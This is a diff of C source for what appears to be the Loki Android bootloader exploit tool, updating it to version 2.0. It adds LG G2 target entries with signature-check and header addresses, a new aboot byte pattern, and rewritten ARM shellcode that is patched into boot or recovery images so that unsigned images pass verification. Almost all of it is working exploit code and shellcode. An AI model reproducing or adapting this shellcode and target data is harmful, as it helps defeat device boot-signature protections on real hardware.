@@ -16,14 +16,13 @@
 #include <stdlib.h>
 #include <unistd.h>
 
-#define VERSION "1.9"
+#define VERSION "2.0"
 
 #define BOOT_MAGIC_SIZE 8
 #define BOOT_NAME_SIZE 16
 #define BOOT_ARGS_SIZE 512
 
-struct boot_img_hdr
-{
+struct boot_img_hdr {
 	unsigned char magic[BOOT_MAGIC_SIZE];
 	unsigned kernel_size;	/* size in bytes */
 	unsigned kernel_addr;	/* physical load addr */
@@ -40,11 +39,14 @@ struct boot_img_hdr
 	unsigned id[8];			/* timestamp / checksum / sha1 / etc */
 };
 
-struct loki_hdr
-{
+struct loki_hdr {
 	unsigned char magic[4];		/* 0x494b4f4c */
 	unsigned int recovery;		/* 0 = boot.img, 1 = recovery.img */
 	unsigned char build[128];	/* Build number */
+
+	unsigned int orig_kernel_size;
+	unsigned int orig_ramdisk_size;
+	unsigned int ramdisk_addr;
 };
 
 struct target {
@@ -177,56 +179,89 @@ struct target targets[] = {
 		.hdr = 0x88f854f4,
 		.lg = 1,
 	},
+	{
+		.vendor = "AT&T",
+		.device = "LG G2",
+		.build = "D80010d",
+		.check_sigs = 0xf8132ac,
+		.hdr = 0xf906440,
+		.lg = 1,
+	},
+	{
+		.vendor = "Verizon",
+		.device = "LG G2",
+		.build = "VS98010b",
+		.check_sigs = 0xf8131f0,
+		.hdr = 0xf906440,
+		.lg = 1,
+	},
 };
 
 #define PATTERN1 "\xf0\xb5\x8f\xb0\x06\x46\xf0\xf7"
 #define PATTERN2 "\xf0\xb5\x8f\xb0\x07\x46\xf0\xf7"
 #define PATTERN3 "\x2d\xe9\xf0\x41\x86\xb0\xf1\xf7"
 #define PATTERN4 "\x2d\xe9\xf0\x4f\xad\xf5\xc6\x6d"
+#define PATTERN5 "\x2d\xe9\xf0\x4f\xad\xf5\x21\x7d"
 
 #define ABOOT_BASE_SAMSUNG 0x88dfffd8
 #define ABOOT_BASE_LG 0x88efffd8
+#define ABOOT_BASE_G2 0xf7fffd8
 
 unsigned char patch[] =
 "\xfe\xb5"
-"\x0b\x4d"
-"\xa8\x6a"
+"\x0d\x4d"
+"\xd5\xf8"
+"\x88\x04"
 "\xab\x68"
 "\x98\x42"
-"\x0e\xd0"
-"\xee\x69"
-"\x09\x4c"
-"\xef\x6a"
+"\x12\xd0"
+"\xd5\xf8"
+"\x90\x64"
+"\x0a\x4c"
+"\xd5\xf8"
+"\x8c\x74"
 "\x07\xf5\x80\x57"
 "\x0f\xce"
 "\x0f\xc4"
 "\x10\x3f"
 "\xfb\xdc"
-"\xa8\x6a"
+"\xd5\xf8"
+"\x88\x04"
 "\x04\x49"
-"\xea\x6a"
+"\xd5\xf8"
+"\x8c\x24"
 "\xa8\x60"
 "\x69\x61"
 "\x2a\x61"
 "\x00\x20"
 "\xfe\xbd"
-"\x00\x00"
-"\xff\xff\xff\xff"		/* Replace with header address */
-"\x00\x00\x20\x82";
+"\xff\xff\xff\xff"
+"\xee\xee\xee\xee";
 
-int patch_shellcode(unsigned int addr)
+int patch_shellcode(unsigned int header, unsigned int ramdisk)
 {
 
-	int i;
+	int i, found_header, found_ramdisk;
 	unsigned int *ptr;
+
+	found_header = 0;
+	found_ramdisk = 0;
 
 	for (i = 0; i < sizeof(patch); i++) {
 		ptr = (unsigned int *)&patch[i];
 		if (*ptr == 0xffffffff) {
-			*ptr = addr;
-			return 0;
+			*ptr = header;
+			found_header = 1;
+		}
+
+		if (*ptr == 0xeeeeeeee) {
+			*ptr = ramdisk;
+			found_ramdisk = 1;
 		}
 	}
+
+	if (found_header && found_ramdisk)
+		return 0;
 
 	return -1;
 }
@@ -309,6 +344,13 @@ int main(int argc, char **argv)
 			target = (unsigned long)ptr - (unsigned long)aboot + aboot_base;
 			break;
 		}
+
+		if (!memcmp(ptr, PATTERN5, 8)) {
+
+			aboot_base = ABOOT_BASE_G2;
+			target = (unsigned long)ptr - (unsigned long)aboot + aboot_base;
+			break;
+		}
 	}
 
 	if (!target) {
@@ -331,11 +373,6 @@ int main(int argc, char **argv)
 	}
 
 	printf("[+] Detected target %s %s build %s\n", tgt->vendor, tgt->device, tgt->build);
-
-	if (patch_shellcode(tgt->hdr) < 0) {
-		printf("[-] Failed to patch shellcode.\n");
-		return 1;
-	}
 
 	/* Map the original boot/recovery image */
 	if (fstat(ifd, &st)) {
@@ -377,10 +414,18 @@ int main(int argc, char **argv)
 	orig_kernel_size = hdr->kernel_size;
 	orig_ramdisk_size = hdr->ramdisk_size;
 
-	/* Store the original values in uses fields of the header */
-	hdr->dt_size = orig_kernel_size;
-	hdr->unused = orig_ramdisk_size;
-	hdr->second_addr = hdr->kernel_addr + ((hdr->kernel_size + page_mask) & ~page_mask);
+	printf("[+] Original kernel address:%.08x\n", hdr->kernel_addr);
+	printf("[+] Original ramdisk address: %.08x\n", hdr->ramdisk_addr);
+
+	/* Store the original values in unused fields of the header */
+	loki_hdr->orig_kernel_size = orig_kernel_size;
+	loki_hdr->orig_ramdisk_size = orig_ramdisk_size;
+	loki_hdr->ramdisk_addr = hdr->kernel_addr + ((hdr->kernel_size + page_mask) & ~page_mask);
+
+	if (patch_shellcode(tgt->hdr, hdr->ramdisk_addr) < 0) {
+		printf("[-] Failed to patch shellcode.\n");
+		return 1;
+	}
 
 	/* Ramdisk must be aligned to a page boundary */
 	hdr->kernel_size = ((hdr->kernel_size + page_mask) & ~page_mask) + hdr->ramdisk_size;
@@ -436,7 +481,20 @@ int main(int argc, char **argv)
 		return 1;
 	}
 
+	/* Save this position for later */
 	pos = lseek(ofd, 0, SEEK_CUR);
+
+	/* Write the device tree if needed */
+	if (hdr->dt_size) {
+
+		printf("[+] Writing device tree.\n");
+
+		if (write(ofd, orig + page_size + page_kernel_size + page_ramdisk_size, hdr->dt_size) != hdr->dt_size) {
+			printf("[-] Failed to write device tree to output file.\n");
+			return 1;
+		}
+	}
+
 	lseek(ofd, pos - (fake_size - offset), SEEK_SET);
 
 	/* Write the patch */
